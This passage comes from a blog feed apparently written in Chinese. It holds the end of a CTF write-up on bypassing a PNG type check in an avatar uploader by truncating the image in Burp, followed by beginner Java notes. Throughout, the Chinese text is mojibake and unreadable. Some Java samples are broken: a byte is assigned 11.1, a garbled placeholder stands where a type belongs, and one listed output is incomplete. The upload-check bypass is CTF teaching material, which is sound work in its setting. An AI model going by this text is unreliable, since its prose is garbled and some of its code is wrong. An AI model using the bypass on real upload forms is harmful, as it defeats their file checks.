invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], UPLOAD_DIR . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$filename</span>);<br><br><span class="hljs-variable">$session</span>-&gt;<span class="hljs-title function_ invoke__">set</span>(<span class="hljs-string">&#x27;avatar&#x27;</span>, <span class="hljs-variable">$filename</span>);<br><span class="hljs-title function_ invoke__">flash</span>(<span class="hljs-string">&#x27;info&#x27;</span>, <span class="hljs-string">&#x27;Your avatar has been successfully updated!&#x27;</span>);<br><span class="hljs-title function_ invoke__">redirect</span>(<span class="hljs-string">&#x27;/&#x27;</span>);<br></code></pre></td></tr></table></figure><p>æ³¨æ„è¿™ä¸¤éƒ¨åˆ†ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$type</span>, [<span class="hljs-string">&#x27;image/png&#x27;</span>])) &#123;<br> <span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&#x27;Uploaded file is not PNG format.&#x27;</span>);<br> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$size</span>[<span class="hljs-number">2</span>] !== IMAGETYPE_PNG) &#123;<br> <span class="hljs-comment">// I hope this never happens...</span><br> <span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&#x27;What happened...? OK, the flag for part 1 is: &lt;code&gt;&#x27;</span> . <span class="hljs-title function_ invoke__">getenv</span>(<span class="hljs-string">&#x27;FLAG1&#x27;</span>) . <span class="hljs-string">&#x27;&lt;/code&gt;&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>finfo</code>å‡½æ•°åˆ¤æ–­è¦æ±‚å›¾ç‰‡å½¢å¼æ˜¯<code>PNG</code>ï¼Œä½†æ¥ä¸‹æ¥<code>getimagesize</code>å‡½æ•°è¦æ±‚å›¾ç‰‡å½¢å¼ä¸èƒ½æ˜¯<code>PNG</code>ã€‚è¿™é‡Œä¹Ÿç”¨ä¸ç€ä¸Šä¼ é©¬ï¼Œåªè¦ä¸Šä¼ æ»¡è¶³ä¸Šé¢è¦æ±‚çš„å›¾ç‰‡å°±è¡Œã€‚ç„¶åä¼šæŠŠç»“æœæ”¾åˆ°<code>JWT</code>é‡Œã€‚</p><p>è¿™é‡Œåº”è¯¥æœ‰ä»€ä¹ˆç»•è¿‡å§¿åŠ¿ï¼Œå‚è€ƒï¼š<code>https://blog.csdn.net/weixin_44037296/article/details/112604812</code></p><blockquote><p>å‡½æ•°<code>finfo_file()</code>å…¶ä¸»è¦æ˜¯è¯†åˆ«<strong>PNG</strong>æ–‡ä»¶åå…­è¿›åˆ¶ä¸‹çš„ç¬¬ä¸€è¡Œä¿¡æ¯ï¼Œå¯ä»¥å°†pngå›¾ç‰‡çš„ç¬¬ä¸€è¡Œä¿ç•™ï¼Œå…¶ä»–å…¨åˆ æ‰ï¼Œè¿™æ ·<code>finfo_file</code>è·å–åˆ°çš„æ˜¯pngï¼Œè€Œ<code>getimagesize</code>è·å–ä¸åˆ°å›¾ç‰‡çš„ç›¸å…³ä¿¡æ¯<br>ç„¶åä¸Šä¼ </p></blockquote><p>ç›´æ¥åœ¨burpé‡Œåˆ å°±è¡Œï¼Œå†…å®¹æˆªæ­¢åˆ°<code>IDHR</code>:</p><p><img src="/img/avauploader5.png" alt="avauploader5"></p><p><img src="/img/avauploader6.png" alt="avauploader6"></p>]]></content>
    
    
    
    <tags>
      
      <tag>åšé¢˜è®°å½•</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JavaåŸºç¡€å­¦ä¹ ç¬”è®°</title>
    <link href="/2023/12/28/2023-12-29-Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_1/"/>
    <url>/2023/12/28/2023-12-29-Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_1/</url>
    
    <content type="html"><![CDATA[<p>ä¸€äº›åŸºç¡€çŸ¥è¯†ï¼Œé•¿æœŸæ›´æ–°</p><span id="more"></span><hr><blockquote><p>ä¸€äº›æœ‰å…³javaçš„åŸºç¡€å­¦ä¹ ç¬”è®°ï¼Œä¹‹å‰ä¸€ç›´åœ¨ä¹¦ä¸Šè®°ï¼Œåé¢æƒ³æƒ³è¿˜æ˜¯ä¸å¤ªæ–¹ä¾¿</p></blockquote><h3 id="å˜é‡"><a href="#å˜é‡" class="headerlink" title="å˜é‡"></a>å˜é‡</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>        <span class="hljs-comment">//å®šä¹‰å˜é‡ï¼Œå†è¿›è¡Œè¾“å‡º</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;<br>        System.out.println(a);<br>        <span class="hljs-comment">//å˜é‡å‚ä¸è®¡ç®—</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-number">20</span>;<br>        System.out.println(a + b);<br>        <span class="hljs-comment">//é‡æ–°å®šä¹‰å˜é‡çš„å€¼</span><br>        a = <span class="hljs-number">50</span>;<br>        System.out.println(a + b);<br>        <span class="hljs-comment">//å¯ä»¥ä¸€æ¡è¯­å¥å®šä¹‰å¤šä¸ªå˜é‡</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> <span class="hljs-number">100</span>, f = <span class="hljs-number">200</span>, g = <span class="hljs-number">300</span>;<br>        System.out.println(e);<br>        System.out.println(f);<br>        System.out.println(g);<br>        <span class="hljs-comment">//å˜é‡åœ¨ä½¿ç”¨å‰å¿…é¡»èµ‹å€¼</span><br>        <span class="hljs-type">int</span> r;<br>        r = <span class="hljs-number">900</span>;<br>        System.out.println(r);<br>    &#125;<br>&#125;<br><span class="hljs-comment">//ç»“æœï¼š</span><br><span class="hljs-number">10</span><br><span class="hljs-number">30</span><br><span class="hljs-number">70</span><br><span class="hljs-number">100</span><br><span class="hljs-number">200</span><br><span class="hljs-number">300</span><br> <br></code></pre></td></tr></table></figure><p>å˜é‡æ³¨æ„äº‹é¡¹ï¼š</p><ul><li>åªèƒ½å­˜ä¸€ä¸ªå€¼</li><li>å˜é‡åä¸å…è®¸é‡å¤å®šä¹‰(å¯ä»¥ä¿®æ”¹å€¼)</li><li>ä¸€æ¡è¯­å¥å¯ä»¥å®šä¹‰å¤šä¸ªå˜é‡</li><li>å˜é‡åœ¨ä½¿ç”¨ä¹‹å‰ä¸€å®šè¦èµ‹å€¼</li><li>å˜é‡çš„ä½œç”¨åŸŸèŒƒå›´</li></ul><h3 id="è®¡ç®—æœºçš„å­˜å‚¨è§„åˆ™"><a href="#è®¡ç®—æœºçš„å­˜å‚¨è§„åˆ™" class="headerlink" title="è®¡ç®—æœºçš„å­˜å‚¨è§„åˆ™"></a>è®¡ç®—æœºçš„å­˜å‚¨è§„åˆ™</h3><ul><li>Text æ–‡æœ¬</li><li>image å›¾ç‰‡</li><li>Sound å£°éŸ³</li></ul><p>è®¡ç®—æœºä¸­ä»»æ„æ•°æ®éƒ½æ˜¯ä»¥äºŒè¿›åˆ¶å½¢å¼å­˜å‚¨çš„ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*JDK7</span><br><span class="hljs-comment">äºŒè¿›åˆ¶ï¼š0bå¼€å¤´</span><br><span class="hljs-comment">å…«è¿›åˆ¶ï¼š0å¼€å¤´</span><br><span class="hljs-comment">åå…­è¿›åˆ¶ï¼š0xå¼€å¤´*/</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>        System.out.println(<span class="hljs-number">017</span>);<span class="hljs-comment">//15</span><br>        System.out.println(<span class="hljs-number">0b1111111</span>);<span class="hljs-comment">//127</span><br>        System.out.println(<span class="hljs-number">0xa7</span>);<span class="hljs-comment">//167</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="æ•°æ®ç±»å‹"><a href="#æ•°æ®ç±»å‹" class="headerlink" title="æ•°æ®ç±»å‹"></a>æ•°æ®ç±»å‹</h3><p><img src="/img/javabiji1.png" alt="javabiji1"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>        <span class="hljs-type">byte</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">127</span>;<br>        <span class="hljs-type">short</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-number">20</span>;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> <span class="hljs-number">30</span>;<br>        <span class="hljs-type">long</span> <span class="hljs-variable">d</span> <span class="hljs-operator">=</span> <span class="hljs-number">40L</span>;<span class="hljs-comment">//è‹¥è¦å®šä¹‰Longç±»å‹çš„å˜é‡ï¼Œåœ¨æ•°æ®ååŠ å¤§å†™æˆ–å°å†™çš„l</span><br>        <span class="hljs-type">float</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> <span class="hljs-number">1.1F</span>;<span class="hljs-comment">//è‹¥è¦å®šä¹‰floatç±»å‹çš„å˜é‡ï¼Œåé¢åŠ ä¸ªå¤§å†™æˆ–å°å†™çš„f</span><br>        <span class="hljs-type">double</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> <span class="hljs-number">2.2</span>;<br>        <span class="hljs-type">char</span> <span class="hljs-variable">g</span> <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;ä»»&#x27;</span>;<br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">k</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p>Javaä¸­æ•°æ®ç±»å‹åˆ†ä¸ºï¼šåŸºæœ¬æ•°æ®ç±»å‹ï¼Œå¼•ç”¨æ•°æ®ç±»å‹ã€‚</p></li><li><p>åŸºæœ¬æ•°æ®ç±»å‹ï¼šå››ç±»å…«ç§ã€‚</p></li><li><p>æ³¨æ„byteçš„å–å€¼èŒƒå›´ï¼š-128 â€“ 127</p></li><li><p>æ•´æ•°å’Œå°æ•°å–å€¼èŒƒå›´å¤§å°å…³ç³»ï¼šdouble &gt; float &gt; long &gt; int &gt; short &gt; byte</p></li><li><p>Longç±»å‹å˜é‡ï¼šLåç¼€ï¼Œå¤§å°å†™å‡å¯</p></li><li><p>floatç±»å‹å˜é‡ï¼šFåç¼€ï¼Œå¤§å°å†™å‡å¯</p></li></ul><h3 id="æ ‡è¯†ç¬¦"><a href="#æ ‡è¯†ç¬¦" class="headerlink" title="æ ‡è¯†ç¬¦"></a>æ ‡è¯†ç¬¦</h3><blockquote><p>å°±æ˜¯ç»™ç±»ã€æ–¹æ³•ã€å˜é‡ç­‰èµ·çš„åå­—ã€‚</p></blockquote><ul><li>å¯ä»¥ç”±æ•°å­—ã€å­—æ¯ã€ä¸‹åˆ’çº¿(_)å’Œç¾å…ƒç¬¦($)ç»„æˆã€‚</li><li>ä¸èƒ½ä»¥æ•°å­—å¼€å¤´</li><li>ä¸èƒ½æ˜¯å…³é”®å­—</li><li>åŒºåˆ†å¤§å°å†™</li></ul><p><img src="/img/javabiji2.png" alt="javabiji2"></p><h3 id="é”®ç›˜å½•å…¥"><a href="#é”®ç›˜å½•å…¥" class="headerlink" title="é”®ç›˜å½•å…¥"></a>é”®ç›˜å½•å…¥</h3><blockquote><p>Scannerè¿™ä¸ªç±»å¯ä»¥æ¥æ”¶é”®ç›˜è¾“å…¥</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Scanner;<br><span class="hljs-type">Scanner</span> <span class="hljs-variable">sc</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br><span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> sc.nextInt();<br></code></pre></td></tr></table></figure><p>æ¯”å¦‚ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Scanner;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br><br>        <span class="hljs-type">Scanner</span> <span class="hljs-variable">sc</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br>        <br>        System.out.println(<span class="hljs-string">&quot;è¯·è¾“å…¥ä¸€ä¸ªæ•´æ•°ï¼š&quot;</span>);<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> sc.nextInt();<span class="hljs-comment">//è°ƒç”¨Scannerå¯¹è±¡çš„nextIntæ–¹æ³•æ¥è¯»å–ä¸€ä¸ªæ•´æ•°</span><br><br>        System.out.println(i);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>é”®ç›˜è¾“å…¥ä¸¤ä¸ªæ•´æ•°å¹¶æ±‚å’Œï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Scanner;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br><br>        <span class="hljs-type">Scanner</span> <span class="hljs-variable">sc</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br><br>        System.out.println(<span class="hljs-string">&quot;è¯·è¾“å…¥ä¸€ä¸ªæ•´æ•°iï¼š&quot;</span>);<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">num1</span> <span class="hljs-operator">=</span> sc.nextInt();<br><br>        System.out.println(<span class="hljs-string">&quot;è¯·å†è¾“å…¥ä¸€ä¸ªæ•´æ•°jï¼š&quot;</span>);<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">num2</span> <span class="hljs-operator">=</span> sc.nextInt();<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">Jieguo</span> <span class="hljs-operator">=</span> num1 + num2;<br><br>        System.out.println(<span class="hljs-string">&quot;ä¸¤æ•°ä¹‹å’Œä¸ºï¼š&quot;</span> + Jieguo);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="è¿ç®—ç¬¦"><a href="#è¿ç®—ç¬¦" class="headerlink" title="è¿ç®—ç¬¦"></a>è¿ç®—ç¬¦</h3><blockquote><p>ç®—æ•°è¿ç®—ç¬¦ï¼šåŠ å‡ä¹˜é™¤å–æ¨¡&#x2F;å–ä½™(%)</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br><br>        System.out.println(<span class="hljs-number">1</span> + <span class="hljs-number">1</span>);<br><br>        System.out.println(<span class="hljs-number">2</span> - <span class="hljs-number">1</span>);<br><br>        System.out.println(<span class="hljs-number">2</span> * <span class="hljs-number">2</span>);<br><br>        System.out.println(<span class="hljs-number">9</span> / <span class="hljs-number">3</span>);<br><br>        System.out.println(<span class="hljs-number">10</span> / <span class="hljs-number">3</span>);<br><br>        System.out.println(<span class="hljs-number">10.0</span> / <span class="hljs-number">3</span>);<br>        <span class="hljs-comment">//å–æ¨¡åº”ç”¨åœºæ™¯ï¼šåˆ¤æ–­æ˜¯å¦å¯ä»¥æ•´é™¤ï¼Œ</span><br>        System.out.println(<span class="hljs-number">9</span> % <span class="hljs-number">2</span>);<br>        <span class="hljs-comment">//æ•´æ•°å‚ä¸è¿ç®—ï¼Œç»“æœåªèƒ½æ˜¯æ•´æ•°</span><br>        <span class="hljs-comment">//æ³¨æ„ï¼Œå¦‚æœæœ‰å°æ•°å‚ä¸è¿ç®—ï¼Œç»“æœå¯èƒ½æ˜¯ä¸ç²¾ç¡®çš„</span><br><br>        System.out.println(<span class="hljs-number">1.1</span> + <span class="hljs-number">1.01</span>);<br><br>    &#125;<br>&#125;<br><span class="hljs-comment">/*ç»“æœï¼š</span><br><span class="hljs-comment">2</span><br><span class="hljs-comment">1</span><br><span class="hljs-comment">4</span><br><span class="hljs-comment">3</span><br><span class="hljs-comment">3</span><br><span class="hljs-comment">1</span><br><span class="hljs-comment">2.1100000000000003</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>ç»ƒä¹ ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//è¦æ±‚åœ¨é”®ç›˜å½•å…¥ä¸€ä¸ªä¸‰ä½æ•°ï¼Œå°†å…¶æ‹†åˆ†ä¸ºä¸ªä½ã€åä½ã€ç™¾ä½åï¼Œæ‰“å°å‡ºæ¥</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br><br>        <span class="hljs-type">Scanner</span> <span class="hljs-variable">sc</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br><br>        System.out.println(<span class="hljs-string">&quot;è¯·è¾“å…¥ä¸€ä¸ªä¸‰ä½æ•°num1ï¼š&quot;</span>);<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">num1</span> <span class="hljs-operator">=</span> sc.nextInt();<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">baiwei</span> <span class="hljs-operator">=</span> (num1 - (num1 % <span class="hljs-number">100</span>)) / <span class="hljs-number">100</span>;<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">shiwei</span> <span class="hljs-operator">=</span> ((num1 - baiwei * <span class="hljs-number">100</span>) - (num1 - baiwei *<span class="hljs-number">100</span>) % <span class="hljs-number">10</span>) / <span class="hljs-number">10</span>;<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">gewei</span> <span class="hljs-operator">=</span> (num1 - baiwei *<span class="hljs-number">100</span> - shiwei * <span class="hljs-number">10</span>);<br><br><br>        System.out.println(<span class="hljs-string">&quot;ç™¾ä½æ˜¯ï¼š&quot;</span> + baiwei);<br><br>        System.out.println(<span class="hljs-string">&quot;åä½æ˜¯ï¼š&quot;</span> + shiwei);<br><br>        System.out.println(<span class="hljs-string">&quot;ä¸ªä½æ˜¯ï¼š&quot;</span> + gewei);<br>    &#125;<br>&#125;<br><span class="hljs-comment">//å—çš„æˆ‘å†™éº»çƒ¦äº†ã€‚ã€‚å”‰</span><br></code></pre></td></tr></table></figure><h3 id="ç®—æ•°è¿ç®—ç¬¦"><a href="#ç®—æ•°è¿ç®—ç¬¦" class="headerlink" title="ç®—æ•°è¿ç®—ç¬¦"></a>ç®—æ•°è¿ç®—ç¬¦</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//æ•°å­—ç›¸åŠ </span><br><br></code></pre></td></tr></table></figure><p>ç±»å‹è½¬æ¢ï¼š</p><ul><li>éšå¼è½¬æ¢(è‡ªåŠ¨ç±»å‹æå‡)ï¼šå–å€¼èŒƒå›´å°çš„æ•°å€¼è½¬æ¢ä¸ºå–å€¼èŒƒå›´å¤§çš„ã€‚</li></ul><p><img src="/img/javalearn4.png" alt="javalearn4"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;<br><br>        <span class="hljs-type">double</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-number">11.1</span>;<br><br>        æ•°æ®ç±»å‹ï¼Ÿ c = a + b; <span class="hljs-comment">//å°çš„å˜å¤§çš„ï¼Œè¿™é‡Œcä¸ºdouble</span><br><br>        System.out.println(c);<br><br>    &#125;<br>&#125;<br><span class="hljs-comment">//åº”æ³¨æ„ï¼Œbyte short char ä¸‰ç§ç±»å‹çš„æ•°æ®åœ¨è¿ç®—æ—¶ï¼Œéƒ½ä¼šå…ˆæå‡ä¸ºintï¼Œå†è¿›è¡Œè¿ç®—</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>        <span class="hljs-type">byte</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;<br><br>        <span class="hljs-type">byte</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-number">11.1</span>;<br><br>        æ•°æ®ç±»å‹ï¼Ÿ c = a + b; <span class="hljs-comment">//è¿™é‡Œcä¸ºint</span><br><br>        System.out.println(c);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å–å€¼èŒƒå›´ï¼šbyte &lt; short &lt; int &lt; long &lt; float &lt; double</p><p>æ•°æ®ç±»å‹ä¸ä¸€æ ·æ—¶ä¸èƒ½è¿›è¡Œè®¡ç®—ï¼Œè½¬æ¢æˆä¸€æ ·çš„æ‰èƒ½è®¡ç®—ã€‚</p><p>ä¸¤ä¸ªè½¬æ¢è§„åˆ™ã€‚</p><ul><li>å¼ºåˆ¶è½¬æ¢ï¼šå–å€¼èŒƒå›´å¤§çš„æ•°å€¼è½¬æ¢ä¸ºå–å€¼èŒƒå›´å°çš„ã€‚</li></ul><blockquote><p>æ ¼å¼ï¼šç›®æ ‡æ•°æ®ç±»å‹ å˜é‡å &#x3D; ï¼ˆç›®æ ‡æ•°æ®ç±»å‹ï¼‰è¢«å¼ºè½¬çš„æ•°æ®ï¼›</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">double</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">12.3</span>;<br><span class="hljs-type">int</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> (<span class="hljs-type">int</span>) a;<br></code></pre></td></tr></table></figure><p>å­—ç¬¦ä¸²  â€œ+â€ æ“ä½œï¼š</p><blockquote><p>å½“ â€œ + â€ æ“ä½œä¸­å‡ºç°å­—ç¬¦ä¸²æ—¶ï¼Œè¿™ä¸ª â€œ + â€æ˜¯å­—ç¬¦ä¸²è¿æ¥ç¬¦ï¼Œè€Œä¸æ˜¯ç®—æ•°è¿ç®—ç¬¦ã€‚ä¼šå°†å‰åçš„æ•°æ®è¿›è¡Œæ‹¼æ¥ï¼Œå¹¶äº§ç”Ÿä¸€ä¸ªæ–°çš„å­—ç¬¦ä¸²ã€‚</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span 